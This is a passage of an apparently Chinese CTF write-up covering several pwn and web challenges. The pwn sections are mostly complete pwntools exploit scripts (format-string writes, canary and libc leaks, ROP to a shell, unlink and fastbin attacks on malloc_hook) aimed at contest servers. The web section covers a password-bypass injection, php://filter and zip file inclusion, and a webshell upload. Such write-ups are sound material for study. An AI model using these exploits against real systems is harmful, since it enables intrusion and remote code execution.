class="number">0x6020F4</span>),<span class="literal">True</span>)</span><br><span class="line">data = add((<span class="string">'%249c'</span>+<span class="string">'%c'</span>*<span class="number">7</span>+<span class="string">'%hhn'</span>).ljust(<span class="number">0x18</span>,<span class="string">'a'</span>)+p64(<span class="number">0x6020f4</span>),<span class="literal">True</span>)</span><br><span class="line">wd = data.index(<span class="string">'[heap]\n'</span>)+<span class="number">7</span></span><br><span class="line">base = int(data[wd:wd+<span class="number">12</span>],<span class="number">16</span>)</span><br><span class="line">add((<span class="string">'%41c'</span>+<span class="string">'%c'</span>*<span class="number">7</span>+<span class="string">'%n%n'</span>).ljust(<span class="number">0x18</span>,<span class="string">'a'</span>)+p64(<span class="number">0x6020F0</span>)+p64(<span class="number">0x6020F4</span>),<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">prctl = <span class="number">0x602078</span></span><br><span class="line">ooo = <span class="number">0x602090</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    system = base + <span class="number">0x45390</span></span><br><span class="line">    free_hook = base + <span class="number">0x3c67a8</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    system = base + <span class="number">0x41490</span></span><br><span class="line">    free_hook = base + <span class="number">0x3a77c8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    data = p64(base+<span class="number">0xf02a4</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    data = p64(base+<span class="number">0x41374</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">    add((<span class="string">'%'</span>+str(ord(data[i])<span class="number">-7</span>)+<span class="string">'c'</span>+<span class="string">'%c'</span>*<span class="number">7</span>+<span class="string">'%hhn'</span>).ljust(<span class="number">0x18</span>,<span class="string">'a'</span>)+p64(ooo+i),<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">add((<span class="string">'%249c'</span>+<span class="string">'%c'</span>*<span class="number">7</span>+<span class="string">'%hhn'</span>).ljust(<span class="number">0x18</span>,<span class="string">'a'</span>)+p64(<span class="number">0x6020f4</span>),<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">print(hex(base))</span><br><span class="line">print(hex(system))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="副墨"><a href="#副墨" class="headerlink" title="副墨"></a>副墨</h3><p>这个题感觉自己有点非预期。太久没做栈溢出有点蠢。首先发现srand的seed是可以溢出改掉的，这意味着后面的rand猜10个数毫无意义。接下来就是官方后门：给了一个格式化字符串和栈溢出。用格式化字符串泄露canary和程序基址，之后就找一个binsh的地址给rdi去调用官方后门pwn的system就好了。一个比较正确的做法应该是用csu来打ROP（队里另一个师傅说的），但我写的时候强行leak了libc的地址，然后用libc里的binsh来给rdi去调用system（为什么我不直接one gadget呢？）。而且leak libc还贼麻烦，对着服务器试了好久才找到对应版本的libc。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"></span><br><span class="line">lt = [<span class="number">0x173db</span>,<span class="number">0x12fc9</span>,<span class="number">0x23bc</span>,<span class="number">0xabb7</span>,<span class="number">0xdfbf</span>,<span class="number">0x11294</span>,<span class="number">0xc09c</span>,<span class="number">0xff2a</span>,<span class="number">0x9101</span>,<span class="number">0x5b55</span>]</span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">	p = process(<span class="string">'./bf.bak'</span>)</span><br><span class="line">	gdb.attach(p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = remote(<span class="string">'111.33.164.4'</span>,<span class="number">50001</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">se</span><span class="params">(x)</span>:</span></span><br><span class="line">	p.send(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span><span class="params">(x)</span>:</span></span><br><span class="line">	p.sendline(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(x)</span>:</span></span><br><span class="line">	p.recvuntil(x)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">'game?\n'</span>)</span><br><span class="line">raw_input()</span><br><span class="line">sl(<span class="string">'1'</span>)</span><br><span class="line">ru(<span class="string">':'</span>)</span><br><span class="line"><span class="comment">#payload = "%17$p%11$p%p"</span></span><br><span class="line">payload = <span class="string">"%17$p%23$p%p"</span></span><br><span class="line">se(payload.ljust(<span class="number">0x20</span>,<span class="string">'a'</span>))</span><br><span class="line"><span class="comment">#sl(payload)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">	ru(<span class="string">':'</span>)</span><br><span class="line">	sl(str(lt[i]))</span><br><span class="line">ru(<span class="string">'0x'</span>)</span><br><span class="line">canary = int(p.recv(<span class="number">16</span>),base = <span class="number">16</span>)</span><br><span class="line">print(hex(canary))</span><br><span class="line">ru(<span class="string">'0x'</span>)</span><br><span class="line">base = int(p.recv(<span class="number">12</span>), base = <span class="number">16</span>)</span><br><span class="line"><span class="comment">#base = base -0xd50</span></span><br><span class="line">base = base - <span class="number">0xabf</span></span><br><span class="line">backdoor = base + <span class="number">0xab3</span></span><br><span class="line">rdi_p = base + <span class="number">0x0000000000000db3</span></span><br><span class="line">rsi_r15_p = base + <span class="number">0x0000000000000db1</span></span><br><span class="line">bss = base + <span class="number">0x202089</span></span><br><span class="line">puts = base + <span class="number">0xbae</span></span><br><span class="line">ru(<span class="string">'0x'</span>)</span><br><span class="line"><span class="comment">#libc = int(p.recv(12), base = 16)-0x3c56a3</span></span><br><span class="line">libc = int(p.recv(<span class="number">12</span>), base = <span class="number">16</span>) - <span class="number">0x83</span> - <span class="number">0x3a62a0</span></span><br><span class="line">system = libc+<span class="number">0x1633e8</span></span><br><span class="line">print(hex(base))</span><br><span class="line">print(hex(puts))</span><br><span class="line">print(hex(libc))</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x30</span>+<span class="string">'\x00'</span>*<span class="number">4</span>+p64(canary)+<span class="string">'/bin/sh\x00'</span>+p64(rdi_p)+p64(system)+p64(backdoor)</span><br><span class="line"><span class="comment">#payload = 'a'*0x30+'\x00'*4+p64(canary)+'/bin/sh\x00'+p64(backdoor)</span></span><br><span class="line">sl(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="洛诵"><a href="#洛诵" class="headerlink" title="洛诵"></a>洛诵</h3><p>这题给的libc是2.27，但是实际还是2.19的libc，因此直接leak libc+heap的地址，然后unlink一波，之后fastbin attack即可</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p=process(<span class="string">'./mybooks'</span>,env=&#123;<span class="string">'LD_PRELOAD'</span>:<span class="string">'./libc.so.6'</span>&#125;)</span><br><span class="line">    gdb.attach(p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p=remote(<span class="string">'111.33.164.6'</span>, <span class="number">50002</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> p.recvuntil(x)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">se</span><span class="params">(x)</span>:</span></span><br><span class="line">    p.send(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span><span class="params">(x)</span>:</span></span><br><span class="line">    p.sendline(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(name,sz,desc)</span>:</span></span><br><span class="line">    sl(<span class="string">'1'</span>)</span><br><span class="line">    ru(<span class="string">'Enter book name (Max 24 chars):'</span>)</span><br><span class="line">    se(name)</span><br><span class="line">    ru(<span class="string">'Enter desc size:'</span>)</span><br><span class="line">    sl(str(sz))</span><br><span class="line">    ru(<span class="string">'Enter book description: '</span>)</span><br><span class="line">    se(desc)</span><br><span class="line">    ru(<span class="string">'&gt;'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,name,desc)</span>:</span></span><br><span class="line">    sl(<span class="string">'3'</span>)</span><br><span class="line">    ru(<span class="string">'Enter the book id you want to edit: '</span>)</span><br><span class="line">    sl(str(idx))</span><br><span class="line">    ru(<span class="string">'name: '</span>)</span><br><span class="line">    se(name)</span><br><span class="line">    ru(<span class="string">'Enter new book description: '</span>)</span><br><span class="line">    se(desc)</span><br><span class="line">    ru(<span class="string">'&gt;'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sl(<span class="string">'2'</span>)</span><br><span class="line">    ru(<span class="string">'delete: '</span>)</span><br><span class="line">    sl(str(idx))</span><br><span class="line">    ru(<span class="string">'&gt; '</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sl(<span class="string">'4'</span>)</span><br><span class="line">    ru(<span class="string">'show: '</span>)</span><br><span class="line">    sl(str(idx))</span><br><span class="line"></span><br><span class="line">ru(<span class="string">'Pls input pass:'</span>)</span><br><span class="line">sl(<span class="string">'\x08\x08\x08\x08\x08\x08\x08\x08\xa4ABB\x08\x08\x08\x08\x08\x08'</span>)</span><br><span class="line">ru(<span class="string">'&gt; '</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="string">'a'</span>*<span class="number">0x18</span>,<span class="number">0x4f8</span>,<span class="string">'aaa'</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="string">'b'</span>*<span class="number">0x18</span>,<span class="number">0xf8</span>,<span class="string">'bbb'</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="string">'c'</span>,<span class="number">0x18</span>,<span class="string">'d'</span>) <span class="comment">#2</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="string">'a'</span>*<span class="number">0x10</span>+<span class="string">'\0'</span>,<span class="number">0x4f8</span>,<span class="string">'c'</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">ru(<span class="string">'Description: '</span>)</span><br><span class="line">libc = u64(ru(<span class="string">'\n'</span>)[:<span class="number">-1</span>]+<span class="string">'\0\0'</span>)<span class="number">-0x63</span>+<span class="number">0x10</span></span><br><span class="line">base = libc - <span class="number">0x3a5610</span></span><br><span class="line">ru(<span class="string">'&gt;'</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="string">'c'</span>*<span class="number">0x18</span>,<span class="number">0x600</span>,<span class="string">'ccc'</span>) <span class="comment">#0</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="string">'c'</span>*<span class="number">0x18</span>,<span class="number">0x4f8</span>,<span class="string">'a'</span>*<span class="number">0x10</span>) <span class="comment">#2</span></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">ru(<span class="string">'a'</span>*<span class="number">0x10</span>)</span><br><span class="line">heap = u64(ru(<span class="string">'\n'</span>)[:<span class="number">-1</span>]+<span class="string">'\0\0'</span>)<span class="number">-0x50</span></span><br><span class="line">ru(<span class="string">'&gt;'</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="string">'a'</span>,<span class="number">0x408</span>+<span class="number">0x290</span>,<span class="string">'aaa'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    add(<span class="string">'a'</span>,<span class="number">0x18</span>,<span class="string">'c'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    delete(i+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="string">'a'</span>,<span class="number">0xf8</span>,<span class="string">'a'</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="string">'b'</span>,<span class="number">0xf8</span>,<span class="string">'b'</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="string">'c'</span>,<span class="number">0xf8</span>,<span class="string">'c'</span>) <span class="comment">#3</span></span><br><span class="line">fake = <span class="string">'a'</span>*<span class="number">136</span> + p64(<span class="number">0x71</span>)+p64(heap+<span class="number">0xbf0</span>)*<span class="number">2</span>+p64(heap+<span class="number">0xbe0</span>)*<span class="number">2</span></span><br><span class="line">fake = fake.ljust(<span class="number">0xf0</span>,<span class="string">'\0'</span>)</span><br><span class="line">fake += p64(<span class="number">0x70</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">'a\n'</span>,fake)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="string">'d'</span>,<span class="number">0x68</span>,<span class="string">'d'</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="string">'e'</span>,<span class="number">0xf8</span>,<span class="string">'e'</span>) <span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">malloc_hook = base+<span class="number">0x3a5610</span></span><br><span class="line"></span><br><span class="line">fake = <span class="string">'a'</span>*<span class="number">136</span> + p64(<span class="number">0x71</span>)+p64(malloc_hook<span class="number">-0x23</span>)</span><br><span class="line">add(<span class="string">'f'</span>, <span class="number">0xf8</span>,fake) <span class="comment">#1</span></span><br><span class="line">add(<span class="string">'g'</span>, <span class="number">0x68</span>,<span class="string">'a'</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="string">'h'</span>,<span class="number">0x68</span>,<span class="string">'a'</span>*<span class="number">11</span>+p64(base+<span class="number">0xd6e77</span>)+p64(base+<span class="number">0x7C6A0</span> ))</span><br><span class="line">sl(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line">print(hex(base))</span><br><span class="line">print(hex(heap))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="正定"><a href="#正定" class="headerlink" title="正定"></a>正定</h3><p>pwn14有个官方后门，只要bss段处某个值（0x4040A0处）大于0x7e3就可以了。题目有很明显的堆溢出。堆溢出修改fastbin中后面一个chunk的fd字段给bss，注意size位的校验（往上几个位置把7f当成size就行），然后直接往里面写ffffffff，操作完之后在选单输入70就会ok然后getshell了。（payload妹操作70，需要自己打一下）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">	p = process(<span class="string">'./pwn14'</span>)</span><br><span class="line">	gdb.attach(p, <span class="string">'b* 0x4015F3'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = remote(<span class="string">'111.33.164.6'</span>,<span class="number">50014</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">se</span><span class="params">(x)</span>:</span></span><br><span class="line">	p.send(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span><span class="params">(x)</span>:</span></span><br><span class="line">	p.sendline(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(x)</span>:</span></span><br><span class="line">	p.recvuntil(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(sz, content)</span>:</span></span><br><span class="line">	ru(<span class="string">'Your choice : '</span>)</span><br><span class="line">	sl(<span class="string">'1'</span>)</span><br><span class="line">	ru(<span class="string">'Size of note : '</span>)</span><br><span class="line">	sl(str(sz))</span><br><span class="line">	ru(<span class="string">'Content of note:'</span>)</span><br><span class="line">	se(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, sz, content)</span>:</span></span><br><span class="line">	ru(<span class="string">'Your choice : '</span>)</span><br><span class="line">	sl(<span class="string">'2'</span>)</span><br><span class="line">	ru(<span class="string">'Index :'</span>)</span><br><span class="line">	sl(str(idx))</span><br><span class="line">	ru(<span class="string">'Size of note : '</span>)</span><br><span class="line">	sl(str(sz))</span><br><span class="line">	ru(<span class="string">'Content of note : '</span>)</span><br><span class="line">	se(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">	ru(<span class="string">'Your choice : '</span>)</span><br><span class="line">	sl(<span class="string">'3'</span>)</span><br><span class="line">	ru(<span class="string">'Index :'</span>)</span><br><span class="line">	sl(str(idx))</span><br><span class="line"></span><br><span class="line">new(<span class="number">0x60</span>, <span class="string">'a'</span>*<span class="number">0x60</span>)</span><br><span class="line">new(<span class="number">0x60</span>, <span class="string">'b'</span>*<span class="number">0x60</span>)</span><br><span class="line">new(<span class="number">0x60</span>, <span class="string">'c'</span>*<span class="number">0x60</span>)</span><br><span class="line">new(<span class="number">0x60</span>, <span class="string">'d'</span>*<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">bss = <span class="number">0x4040a0</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">0x60</span>*<span class="number">2</span>+<span class="number">0x10</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>) + p64(bss<span class="number">-0x13</span>)</span><br><span class="line">edit(<span class="number">0</span>, len(payload), payload)</span><br><span class="line"></span><br><span class="line">new(<span class="number">0x60</span>, <span class="string">'e'</span>*<span class="number">0x60</span>)</span><br><span class="line">new(<span class="number">0x60</span>, <span class="string">'\xff'</span>*<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="一苇"><a href="#一苇" class="headerlink" title="一苇"></a>一苇</h3><p>有官方后门，栈溢出。调用两次。第一次leak出程序基址<del>（话说仔细想想好像也不用leak）</del> ，第二次覆写rip的低三位到官方后门即可。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">	p = process(<span class="string">'./pwn13'</span>)</span><br><span class="line">	gdb.attach(p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = remote(<span class="string">'111.33.164.6'</span>,<span class="number">50013</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">se</span><span class="params">(x)</span>:</span></span><br><span class="line">	p.send(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span><span class="params">(x)</span>:</span></span><br><span class="line">	p.sendline(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(x)</span>:</span></span><br><span class="line">	p.recvuntil(x)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">':'</span>)</span><br><span class="line">payload = <span class="string">'aaaaaaaa'</span></span><br><span class="line">sl(<span class="string">'1'</span>)</span><br><span class="line">ru(<span class="string">'input massage\n'</span>)</span><br><span class="line">se(payload+<span class="string">'\n'</span>)</span><br><span class="line">ru(<span class="string">'your message:'</span>)</span><br><span class="line">p.recvuntil(payload)</span><br><span class="line">x = u64((p.recv(<span class="number">6</span>)).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">print(hex(x))</span><br><span class="line">base = x - <span class="number">0xa0a</span></span><br><span class="line">backdoor = base + <span class="number">0xa50</span></span><br><span class="line">print(hex(backdoor))</span><br><span class="line"></span><br><span class="line">ru(<span class="string">'your choice:'</span>)</span><br><span class="line">sl(<span class="string">'1'</span>)</span><br><span class="line">ru(<span class="string">'input massage\n'</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x28</span>+p64(backdoor)[<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line">print(len(payload))</span><br><span class="line">se(payload)</span><br><span class="line"><span class="comment">#raw_input()</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="空相"><a href="#空相" class="headerlink" title="空相"></a>空相</h3><img src="/2019/08/29/fifth-space-wp/1.png">
+<p>尝试万能密码</p>
+<img src="/2019/08/29/fifth-space-wp/2.png">
+<img src="/2019/08/29/fifth-space-wp/3.png">
+<h3 id="空性"><a href="#空性" class="headerlink" title="空性"></a>空性</h3><p>前端得到地址</p>
+<img src="/2019/08/29/fifth-space-wp/4.png">
+<img src="/2019/08/29/fifth-space-wp/5.png">
+<p>猜测为vim 缓存文件，访问 .xxx.php.swp，得到源码</p>
+<img src="/2019/08/29/fifth-space-wp/6.png">
+<p>file_get_contents 当文件不存在时返回空</p>
+<p>extract 可替换掉 $a，所以构造 payload</p>
+<p>/?fname=1&amp;a=</p>
+<img src="/2019/08/29/fifth-space-wp/7.png">
+<p>点击进入，看到文件上传</p>
+<img src="/2019/08/29/fifth-space-wp/8.png">
+<p>上传只支持jpg、png、gif、zip、mp3、csv等文件格式</p>
+<p>猜测存在 zip 协议的文件包含，需要寻找包含点，查看刚刚url</p>
+<p><a href="http://111.33.164.6:10003/2d019a311aaa30427.php?refer=df53ca268240ca76670c8566ee54568a&amp;t=20190828&amp;dtype=computer&amp;file=3792689baaabc7eb&amp;hash256=66a4640314ba953927b210a33e8f9393" target="_blank" rel="noopener">http://111.33.164.6:10003/2d019a311aaa30427.php?refer=df53ca268240ca76670c8566ee54568a&amp;t=20190828&amp;dtype=computer&amp;file=3792689baaabc7eb&amp;hash256=66a4640314ba953927b210a33e8f9393</a></p>
+<p>存在参数<br>file，将其值替换为 php://filter/read=convert.base64-encode/resource=3792689baaabc7eb</p>
+<img src="/2019/08/29/fifth-space-wp/9.png">
+<p>文件包含！</p>
+<p>访问3792689baaabc7eb.php发现不存在，3792689baaabc7eb.html 存在，得知后缀加了 .html，所以构造 .html 的 zip </p>
+<img src="/2019/08/29/fifth-space-wp/10.png">
+<p>上传后，蚁剑连接</p>
+<img src="/2019/08/29/fifth-space-wp/11.png">
+<p>得到 flag</p>
+<img src="/2019/08/29/fifth-space-wp/12.png">
